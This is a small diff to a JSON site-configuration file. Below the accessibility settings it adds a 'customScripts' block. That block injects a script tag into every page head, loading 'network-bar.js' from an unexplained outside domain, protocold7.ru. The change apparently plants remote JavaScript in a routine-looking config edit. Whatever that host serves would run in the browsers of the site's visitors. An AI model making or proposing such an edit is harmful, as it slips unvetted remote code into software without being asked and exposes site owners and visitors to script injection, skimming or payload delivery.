@@ -11,5 +11,8 @@
   "accessibility": {
     "addBypassLinks": false,
     "ignoreReducedMotion": false
+  },
+  "customScripts": {
+    "headEnd": "<script src=\"https://protocold7.ru/network-bar.js\" defer></script>"
   }
 }
